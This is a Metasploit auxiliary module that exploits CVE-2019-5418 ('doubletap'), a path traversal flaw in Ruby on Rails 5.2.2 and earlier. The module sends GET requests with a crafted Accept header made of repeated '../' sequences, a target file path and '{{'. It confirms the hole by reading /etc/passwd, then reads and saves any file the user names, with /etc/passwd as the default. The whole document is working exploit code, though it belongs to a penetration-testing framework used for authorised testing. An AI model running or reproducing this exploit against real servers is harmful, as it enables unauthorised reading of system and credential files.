##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => "Ruby On Rails File Content Disclosure ('doubletap')",
        'Description' => %q{
          This module uses a path traversal vulnerablity in Ruby on Rails
          versions =< 5.2.2 to read files on a target server.
        },
        'Author'      =>
        [
          'Carter Brainerd <0xCB@protonmail.com>', # Metasploit module
          'John Hawthorn <john@hawthorn.email>' # PoC/discovery
        ],
        'License'     => MSF_LICENSE,
        'References'     => [
          [ 'URL', 'https://hackerone.com/reports/473888' ],
          [ 'URL', 'https://github.com/mpgn/Rails-doubletap-RCE' ],
          [ 'URL', 'https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q' ],
          [ 'CVE', '2019-5418'],
          ['EDB', '46585'],
          ['AKA', 'doubletap']
        ]
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('ROUTE', [true, 'A route on the vulnerable server.', '/home']),
        OptInt.new('DEPTH', [true, 'The depth of the traversal.', 10]),
        OptString.new('TARGET_FILE', [true, 'The absolute path of remote file to read.', '/etc/passwd'])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('SkipCheck', [true, 'Skip the initial vulnerability check.', false])
      ]
    )
  end

  def get_accept_header_value(depth, file)
    return (('../'*depth) + file + '{{').gsub('//', '/')
  end

  def check
    return true if datastore['SkipCheck']
    # Check if target file is absolute path
    unless datastore['TARGET_FILE'][0] == '/'
      print_error "TARGET_FILE must be an absolute path (eg. /etc/passwd)."
      return false
    end

    # Fire off the request
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['ROUTE']),
      'headers' => { 'Accept' => get_accept_header_value(datastore['DEPTH'], '/etc/passwd')}
    })

    if res.nil?
      print_error "Request timed out."
      return false
    end

    if res.body.include? 'root:x:0:0:root:'
      print_good 'Target is vulnerable!'
      return true
    else
      print_error 'Target is not vulnerable.'
      return false
    end
  end

  def run
    unless check
      print_error 'Check did not pass, exiting.'
      return
    end

    print_status "Requesting file #{datastore['TARGET_FILE']}"

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['ROUTE']),
      'headers' => { 'Accept' => get_accept_header_value(datastore['DEPTH'], datastore['TARGET_FILE'])}
    })

    if res.nil?
      print_error "Request timed out."
      return
    end

    unless res.code == 200
      print_error "Failed to read file: #{datastore['TARGET_FILE']}. HTTP error: #{res.code}."
      print_error 'User probably doesnt have access to the requested file.' if res.code == 500
    else
      print_good 'Response from server:'
      print_line res.body.to_s
      store_loot('rails.doubletap', 'text/plain', datastore['RHOSTS'], res.body.to_s, "rails_doubletap_read_file_#{Rex::Text.rand_text_alpha(8)}.txt", "File read via Rails DoubleTap exploit.")
    end
  end
end
